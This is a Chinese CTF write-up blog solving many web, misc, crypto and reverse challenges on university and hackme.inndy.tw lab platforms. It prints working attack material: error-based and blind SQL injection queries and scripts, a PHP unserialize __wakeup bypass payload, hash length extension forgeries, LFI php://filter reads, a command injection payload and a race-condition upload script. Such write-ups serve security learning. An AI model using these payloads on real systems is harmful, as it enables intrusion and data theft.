之后就可以惊喜的看到本题的flag和下个“上传2”题目的flag（2333..） 自动获取flag程序题目说了要修改一下程序，查看源代码 123456789101112131415161718192021222324252627282930313233// 请求参数一$(\"#a\").click(function()&#123; $.ajax(&#123; url:'param1.php', method:'get', dataType:'json', success:calParam2 &#125;)&#125;);function calParam2(d)&#123; var data=JSON.parse((d.param)); var length=data.length; var second=new Date().getSeconds(); var sum=0; for (var i = 1; i &lt; length; i++) &#123; for (var j = 0; j &lt; length/2; j++) &#123; sum+=parseInt(data[i])*second + data[j]; &#125; &#125; // 请求flag $.ajax(&#123; url:'http://new.ctf.param.com/aram2.php?sum='+sum, method:'get', dataType:'json', success:function(s)&#123; alert(s.f); &#125;, error:function(s)&#123; alert('错了'); &#125; &#125;)&#125; 看到有个param1.php的请求，访问一下得到 1&#123;&quot;param&quot;:&quot;[&quot;1&quot;,&quot;6&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;2&quot;,&quot;8&quot;,&quot;4&quot;,&quot;9&quot;,&quot;1&quot;,&quot;10&quot;]&quot;&#125; Cookie？查看cookie发现user值为guest，改为admin再刷新即可 一看就是维吉尼亚密码，解密一下就可以了 上传二见上传一 logic查看源代码可以发现 应该是存在vim泄漏，尝试访问 submit.php.swp 发现泄漏文件，关键代码如下 12345678910111213if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die('fail'); if($token!='0') die('fail'); $sql = \"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\"; $r = mysql_query($sql) or die('db error'); $r = mysql_fetch_assoc($r); $r = $r['num']; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo \"失败了呀\"; &#125;&#125; 题目一看就是很简单的弱比较，但是提交之后却无法正常回显，而是返回you are not admin，再看上图，admin应该就是chengyurui，所以邮箱为 chenyurui@gmail.com ，再提交一个0e12345678 即可。 上传三bp抓包尝试不同的后缀，尝试 phtml 发现可以上传成功，即上传 snow.phtml ，题目返回信息 可以看到我们的文件已经上传成功了(文件被执行了)，只是被后台查杀了，这就说明我们可以利用条件竞争来做这道题 用burpsuite连续发包，在写个代码连续读取 123456import requestsurl = \"http://202.119.201.199/challenge/web/uploadfile/upload/snow.phtml\"while True: content = requests.get(url).text if \"flag\" in content: print(content) 然后即可读到flag is hash safe??题目给出了提示，应该是文件泄露，发现admin.php.swp存在，下载之，在linux下输入命令 1vim -r amdin.php.swp 即可恢复出源代码，核心代码如下 123456789101112131415161718192021222324252627282930&lt;?php$auth = false;$role = \"guest\";$salt =\"xxxxxxxxxxxxx\";//len:13if (isset($_COOKIE[\"role\"])) &#123; $role = $_COOKIE[\"role\"]; $hsh = $_COOKIE[\"hsh\"]; if (stripos($role,\"admin\")!==false&amp;&amp;$hsh === md5($salt.$_COOKIE[\"role\"])) &#123; $auth = true; &#125; else &#123; $auth = false; &#125;&#125; else &#123; $s = $role; setcookie('role',$s); $hsh = md5($salt.$s); setcookie('hsh',$hsh);&#125;if ($auth) &#123; echo \"&lt;h3&gt;Welcome Admin.Your flag is cumtctf&#123;you_know_this_is_not_the_flag&#125;\";&#125; else &#123; echo \"&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;\";&#125;?&gt; 一看就是哈希长度扩展攻击 原理介绍工具介绍 我们可以用hashpump工具来做 由上面介绍的原理可以知道，在本题中，参与第一次md5哈希的可控字符串为guest，也就是说，本题中，我们已知的内容有$salt（代码加的盐，具体内容未知）的长度为13，$salt与guest拼接后的MD5哈希值c70ab9d039f166c5b5f506a5698ebaa1，那么基于此，我们可以构造哈希扩展攻击 Input signature输入明文哈希，Input data输入第一次参与哈希的字符串的结尾的一部分，长度为$salt长度加上去掉inputdata之后字符串的长度，附加值随便，但是不能空，由于本题需要role中存在admin，所以我追加的是admin。比如本题中原来第一次参与hash的字符串为guest，我选择最后一个字符t作为inputdata，那么长度就为len($salt)+len(&#39;gues&#39;)=17，之后就会返回构造好的字符串和哈希值，把上面的\\x替换为%，之后修改cookie值，role=&gt;guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00admin，hsh=&gt;37d0fe2c401a689be9608e9f850ef3de，再刷新就可以得到flag了。 淘金这个题目的目标是抢金币达到1000即可通关，每次抢金币需要在三秒内输入验证码，成功即可抢到1金币，如果有毅力的话是可以手动抢的，或者写一个在线识别验证码的程序来自动抢也是可以的，但是这题还有更好的方案就是在我们提交验证码的环节，如果我们在请求中删去验证码字段即可成功抢到金币（也就是说验证码使可以绕过的），只是不确定这个是题目漏洞还是正解。代码如下，为了效率，同时抢多个人· 123456789101112131415import requestsimport timeurl_post = r'http://bxs.cumt.edu.cn/challenge/web/robber/dorob.php'url_get = r'http://bxs.cumt.edu.cn/challenge/web/robber/rob.php?id='cookies=&#123;\"PHPSESSID\":\"2fle5nf7jrvi8lksme7uq0j1a3\",\"ssid\":\"a9598c3315159a39bbd981b8ec6fdb6d\"&#125; s = requests.session()names = [\"bxsrc\",\"333\",\"08163266\",\"EddieIvan\"]ids = [144,125,142,109]while True: for i in range(len(names)): data = \"user=\"+str(ids[i])+\"&amp;num=1\" req1 = s.get(url=url_get+str(ids[i]),cookies=cookies) print(url_get+str(ids[i])) req2 = s.post(url=url_post,cookies=cookies,data=data) time.sleep(5) 听说你会面向对象题目给出了源代码，核心代码如下 123456789101112131415161718192021222324252627&lt;?php//flag in flag.phpclass Admin&#123; public $file = 'flag.php'; public function __construct($f) &#123; $this-&gt;file = $f; &#125; public function __wakeup() &#123; // TODO: Implement __wakeup() method. if (stripos($this-&gt;file,'flag')+1)&#123; echo 'dangerrous'; $this-&gt;file = 'index.php'; &#125; &#125; public function __destruct() &#123; var_dump($this-&gt;file); var_dump(file_exists($this-&gt;file)); // TODO: Implement __destruct() method. if (!strpos($this-&gt;file,'/')&amp;&amp;!strpos($this-&gt;file,'\\\\'))&#123; highlight_file($this-&gt;file); &#125;else die('你想干嘛'); &#125;&#125; 题目需要绕过需要__wakeup()函数，百度发现该处存在一个CVE漏洞 Click Here 我们写php代码序列化 12345class Admin&#123; public $file = 'flag.php';&#125;$obj = new Admin();echo serialize($obj); 题目返回 O:5:&quot;Admin&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} ，我们只需要把Admin后面的1修改为2然后在url编码即可，最终payload 1O%3A5%3A%22Admin%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D phpmywind首先得到flag非常简单，题目好像出bug了，访问首页直接就可以得到flag：） 但是题目好像修复了(事实上题目本身没有任何问题，之所以可看到flag是因为已经有大佬做出来了)，所以我们还是要来一波正解 题目给出来cms和版本，直接百度搜索漏洞，发现有个前台sql注入漏洞，需要先注册一个合法用户，我注册了一个用户为test_snow，密码123456，登录，然后在该网址下提交如下内容(因为该题目没有回显，所以使用了报错注入) 于是就可以看到数据库名，说明该报错方法可用， 但是该语句无法使用select语句，网上查找到了另一种报错注入的方法 1select count(*),concat(char(@`%27`),(select schema_name from information_schema.schemata limit 1,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x 可以利用这种方法报库名，发现这个库名为 phpmyflag ，虽然不是当前库，但是flag应该就是在这个库中 爆表名 1select count(*),concat(char(@`%27`),(select table_name from information_schema.tables where table_schema=0x7068706d79666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x 本题中如果没有报错的话就会显示账号完善成功，这里只需要再次登录一下就可以了，由于题目转义过滤了单引号，所以使用了十六进制绕过 爆列名 1select count(*),concat(char(@`%27`),(select column_name from information_schema.columns where table_name=0x666c6167 limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x 读flag 1select count(*),concat(char(@`%27`),(select flag from phpmyflag.flag limit 0,1), 0x23,floor(rand(0)*2),char(@`%27`))x from information_schema.tables group by x 之前我以为flag在当前数据库中，走了不少弯路，看来还是自己思维太局限了 参考链接 BASICdecodehex打开再base64解码即可 白驹过隙访问题目出现 You Have Missed the Flag ~&gt;.&lt;~ 开始猜测可能是某次返回的正确的flag，于是一连访问了1000次还是一无所获，后面想到它说 “You Missed flag”，所以思路应该是发生了302跳转，抓包也没有发现什么异常，没找到时哪儿发生了302跳转，后面一个偶然的机会，我们在原来题目链接出查看一下链接 再看题目页面的链接 http://202.119.201.199/challenge/basic/http/defauIt.php 仔细看一下，会发现两个 default.php 中题目给的链接中default倒数第二位是小写的L，而到了题目中变成了大写的 i ！！，如此的话跳转就清楚了，可以访问default.php(l为小写的L) 可以看到确实发生了302跳转，抓包 可以看到此处跳转到了defauIt.php(大写的i)，也可以看到我们读到了flag 或者你也可以直接挑战页面点击题目链接抓包，也可以读到flag，原理是一样的 齐白石16进制编辑器查看一下即可在字符串末尾看到flag encode题目给出的是jsfuck代码，直接找在线网站运行一下借口得到flag DNS解析直接修改本地hosts文件解开，linux下修改/etc/hosts文件，添加一行数据 1202.119.201.199 welcome.bxsteam.xyz 然后访问welcome.bxsteam.xyz即可得到flag 签到1邮件查看源代码，base64解码一下即可得到flag 签到2按照题目要去F12转到控制台在点击网络选项卡，选择重新载入，之后再消息头中的flag字段即可看到flag 超简单的密码键盘加密，低头看下键盘即可，网上也有在线解密网站 滑稽ppt伪加密，打开后提示需要输入密码，网上找到一种方法可以绕过 破解pptx只读需要密码重命名qzxdh.pptx为qzxdh.zip，解压到当前文件夹后，切换到\\ppt之下，用记事本开启presentation.xml文件；把整块选中并删除，保存并关闭；将文件再打包成qzxdh.zip，更名为pptx即可。本文来自 qzxdh 的CSDN 博客 ，全文地址请点击：https://blog.csdn.net/qzxdh/article/details/72624298?utm_source=copy 按照该方法即可打开PPT，之后拖动首页幻灯片后即可发现后面还藏着一张幻灯片，里面就有flag Fast 30一道很常规的题目，就是不断把题目返回的信息在两秒之内发回去，这肯定不能人工操作，需要编程，本题需要提交的内容是header头里面的Flag字段的值，代码如下 123456789import requestsurl = \"http://web.bxsteam.xyz/fast/\"header = requests.get(url).headers[\"Flag\"]while True: header = requests.post(url,data=&#123;\"key\":header&#125;).headers['Flag'] ans = requests.post(url,data=&#123;\"key\":header&#125;).text if '&#123;' in ans: break MISCLSB题目给出了提示，lsb色道隐写，丢进steg里面看一下，发现rgb的每个0通道里面，图片上方都有会多出一个黑块，说明和这三个色道有关系 提取一下这三个色道的信息，发现时png文件头 提取保存为png图片是个二维码，直接扫码就可以看到flag 爱因斯坦右键查看图片属性，发现在备注里面有一串字符 this_is_not_password，感觉这应该是压缩包密码，猜测图片中应该隐含了一个压缩包，hed软件打开图片，直接搜索 504b0304 (zip文件头)，果然找到了，而且在右边的字符串中还看到了flag.txt字样，直接将这段提取出来，改后缀为zip，解压，提示需要密码，输入前面的字符串 this_is_not_password ，解压即可得到flag 视而不见看了好久没思路，网上发现bmp图像的题目基本都是色道隐写的问题，于是就用stegsolve软件疯狂尝试，analyse-&gt;steteogram-&gt;solver里面修改偏移值找到了flag(233333) 鲨鱼的套路打开数据包，追踪tcp流，发现如下内容 123456789101112hellohehei will give you flag~obut you must tell me te.he anhhao...ao~woyaohuinongcunok i will give you flag~just revice .......g.receive itUEsDBBQAAAgIANeFfErNFL6kGwAAABsAAAAcAAAAaGludF9zb21lIF90aGluZ19pc19mYWtlLnR4dEvLSUyvTs5IzUuPL87IjC9JzI/PKQUyU/NqAVBLAQI/ABQACQAIANeFfErNFL6kGwAAABsAAAAcACQAAAAAAAAAIAAAAAAAAABoaW50X3NvbWUgX3RoaW5nX2lzX2Zha2UudHh0CgAgAAAAAAABABgAu7Ux1J+n0gGhDeAnl6fSAaEN4CeXp9IBUEsFBgAAAAABAAEAbgAAAFUAAAAAAA==~bye~o 这段应该是base64，但是在线网站无法解码，自己尝试，发现是个压缩包，保存为zip格式 之后是zip伪加密 easy crypto解压之后有个morse.txt，一看就是摩斯密码，解码为 keyisvigenerecipher ，提到了维吉尼亚密码，直接解密flag.txt，key就是 vigenerecipher ，然后解码即可得到flag code题目给出了代码 1234char getCode(char orgin) &#123; return ( key1 * (orgin-97) + key2 ) % 26 + 97;&#125;code : joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm 注意题目的路径其实给出了提示 challenge/misc/fangshe/ ，最后的 fangshe 其实就是仿射的意思，意思是本题是一道放射密码的题目，就是位置为key1和key2的仿射加密，网上说了key1，key2的范围是小于26的，我们数论刚开始学，我也不是很理解，我个人感觉应该是由于题目的函数如果把key1和key2看做x和y的话，key1 * (orgin-97) + key2就是一条直线，那么key值大于26之后模26是会和前面重复的，这个以后学了得在研究一下，但是这题我们可尝试暴力破解，需要注意的是我之前以为题目给的code是密文，但事实上人家给的是明文，密文是flag ……. 123456789cipher = \"joqtgyvlmcqivvvvmmmmzzzzcccciiiijjjjoooossssqqqqmmmm\"ans = \"\"for key1 in range(0,26): for key2 in range(0,26): ans = \"\" for char in cipher: ans += chr((key1 * (ord(char)-97) + key2) % 26 + 97) if \"flag\" in ans or \"ctf\" in ans: print(ans) 跑完之后发现其中一个结果是 heiboyflagisffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa 断句一下为 hei boy,flag is ffffaaaannnnggggsssshhhheeeemmmmiiiiaaaa PS Master题目提示的很明显了，和ps有关，那基本就是图层的问题了，但是题目的文件用PS无法打开，binwalk一下发现是个gif图片，修改文件后缀为gif，发现可以用PS打开，打开之后第二个图层是个二维码，但是无法扫描，因为定位块上都有个二哈 参照标准二维码可以知道，左上，右上，左下都应该是黑色的定位块，可以用win10自带的画图工具把右上的块复制到左上和左下，然后把二哈图案用黑色填充，处理之后如下，扫码可得flag 传感器1题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下 1234567891011121314151617def Manchester(s): ans = '' for i in range(len(s)//2): if s[i*2:i*2+2] == '01': ans += '1'; elif s[i*2:i*2+2] == '10': ans += '0'; else: print(\"error in\",i) break return anss = \"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101\"p = Manchester(s)flag = \"\"for i in range(len(p)//8): flag += p[i*8:i*8+8][::-1]print(hex(int(flag,2))) 我就想试试这个名字到底能够起多长下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头) 保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。 你的石锅拌饭题目给出了提示信息，培根，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式 第一种方式： A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下 1ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB 对照解密即可，也可以在在线网站解密 shark题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息 感觉题目应该是和ftp有关，过滤一下ftp协议 这就基本确定了本题就是获取这个flag.zip，直接 tcp contains &quot;flag&quot; ，可以看到FTP-DATA协议中传输了flag.zip的数据 追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存 文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK 解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下 然后保存为png图片打开就OK了 学姐真美下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可 是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可 md5哈希长度扩展攻击，和web里面的 is hash safe? 相同类型，所以原理就不多说了，直接上工具 12345root@kali:~# hashpumpInput Signature: 4dbe35eaea655b0a2b0d06391175b8a3Input Data: rInput Key Length: 18Input Data to Add: snow 得到结果 1265710003c2ff40389b064d3a020487bdr\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x98\\x00\\x00\\x00\\x00\\x00\\x00\\x00snow 第一行md5提交，第二行在前面加上 cy 在将 \\x 换成空格，字母换成16进制表示即可，最终为 163 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77 提交即可得到flag 大家来找茬既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag 1compare 00000000.png 00000668.png 3.png 据说是个签到题流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\\r\\n ，感觉应该上传了什么东西，于是过滤tcp包 tcp contains &quot;upload&quot; 发现了数据传输，从第二个开始追踪tcp流 发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下 1234567891011121314151617181920212223from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + \"\\0\" * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'a = \"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==\"b = base64.b64decode(a)print decrypt(b,\"Qq4wdrhhyEWe4qBF\") 萌萌哒颜文字密码(aaencode)，在线解码一下 alert(“3Nc0d3.txt”) 访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag 魂斗罗下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下 然后开启1p模式通过即可，一共好像是8关 注意flag里面的字符是5不是s！ 传感器2前面一道题目的加强版， 按照之前题目的步骤求一下ID值 1245psi: fffffed31f635055f830psi: fffffed31f425055d7 可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为 12345# py3a = (int('63',16)-int('42',16))/15 * 5b = int('42',16) - int(a)print(hex(b))# @ans=0x37 补上ID之后求校验码 123456a = \"feb757375055\"sum = 0;for i in range(len(a)//2): sum += int(a[i*2:i*2+2],16)print(hex(sum%256))# @ans=0xe8 那么最终的明文为 FFFFFEB757375055E8 猜猜看题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行 1jpseek.exe guess_flag.jpg flag.txt 提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下 12345s = \"\" # 此处应为flag.txt中的二进制串hex_s = \"\"for i in range(len(s)//8): hex_s += hex(int(s[i*8:i*8+8],2))[2:4]print(hex_s) 在线解码为字符串 1&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1/ZOUGIgHlqN2eqtoYljfQfuGiQ/Pr9+/cv4P/5609/APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7/7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux/l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ/u5oyT08mD/YPL/XuTP/EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA/kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI/MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z/hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y/22wk7PaJTfqPv1E/bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4/ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k/tql2wX3e/pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH/3HxZ95/r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv/MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t/4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT/P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm/SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC/Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ/emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl/t03t4J9/rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq//mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB/kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk/8r9/TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg==&quot;&gt;&lt;/img&gt; 一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag 这题还发现个stegdetect工具，收获挺大。 REVERSEGift题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译 1apktool d Gift.apk 在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"hackme-web题解","slug":"hackme","date":"2018-08-28T15:06:49.673Z","updated":"2019-01-30T11:49:49.997Z","comments":true,"path":"2018/08/28/hackme/","link":"","permalink":"http://chaosec.top/2018/08/28/hackme/","excerpt":"前言最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/","text":"前言最近rootme网站好像有点问题，所以刷点hackme网站的题目，网址https://hackme.inndy.tw/ LFI查看源代码 尝试读取 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag Can you read the flag&lt;?php require(‘config.php’); ?&gt;? 读取config即可得到flag 1https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/config homepage查看代码在结尾看到一个cute.js，跟踪一下，发现aaencode编码，丢在控制台执行即可得到二维码，扫描即可 ping命令执行，我们可以使用 $() 或者 都可以实现执行命令的作用 1https://hackme.inndy.tw/ping/?ip=$(ls -a) 然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试 1https://hackme.inndy.tw/ping/?ip=$(tac *.*) scoreboardf12查看点击网络，查看一下消息头即可看到flag login as admin 0题目主要源码如下 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phprequire('config.php');// table schema// user -&gt; id, user, password, is_adminif($_GET['show_source'] === '1') &#123; highlight_file(__FILE__); exit;&#125;function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\'\", $str);&#125;$_POST = array_map(safe_filter, $_POST);$user = null;// connect to databaseif(!empty($_POST['name']) &amp;&amp; !empty($_POST['password'])) &#123; $connection_string = sprintf('mysql:host=%s;dbname=%s;charset=utf8mb4', DB_HOST, DB_NAME); $db = new PDO($connection_string, DB_USER, DB_PASS); $sql = sprintf(\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\", $_POST['name'], $_POST['password'] ); try &#123; $query = $db-&gt;query($sql); if($query) &#123; $user = $query-&gt;fetchObject(); &#125; else &#123; $user = false; &#125; &#125; catch(Exception $e) &#123; $user = false; &#125;&#125;?&gt; 本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下 1234567891011function safe_filter($str)&#123; $strl = strtolower($str); if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') || strstr($strl, 'update') || strstr($strl, 'delete') ) &#123; return ''; &#125; return str_replace(\"'\", \"\\\\\\\\'\", $str);&#125;$_ 可以看到，题目过滤了 or 1=1 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下 1name=guest\\&apos; or user=0x61646d696e-- +&amp;password=guest login as admin 0.1上个题目的加强版，直接union注入即可，最终payload如下 1name=guest\\&apos; union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password=123465 login as admin 1题目过滤并不严格，payload如下 1admin\\&apos;/**/or/**/1/**/limit/**/0,1# login as admin 1.2上一题的加强版，需要进行盲注，代码如下 123456789101112131415161718192021222324import requestsurl = \"https://hackme.inndy.tw/login1/index.php\"length = 1flag = \"\"# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#\"# database:login_as_admin1# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#\"# tables: 0bdb54c98123f5526ccaed982d2006a9,users# payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#\"# id,4a391a11cfa831ca740cf8d00782f3a6payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#\" data = &#123;'name':r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#\", 'password':\"123\"&#125;for i in range(0,70): for j in range(32,128): data['name'] = payload1.format(str(length),str(j)) content = requests.post(url,data=data).text if \"FLAG\" in content: flag += chr(j) print('**flag:**',flag) length += 1 break login as admin 3题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 != ，这就存在弱比较的漏洞 123456789101112131415161718function load_user()&#123; global $secret, $error; if(empty($_COOKIE['user'])) &#123; return null; &#125; $unserialized = json_decode(base64_decode($_COOKIE['user']), true); $r = hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']; if(hash_hmac('sha512', $unserialized['data'], $secret) != $unserialized['sig']) &#123; $error = 'Invalid session'; return false; &#125; $data = json_decode($unserialized['data'], true); return [ 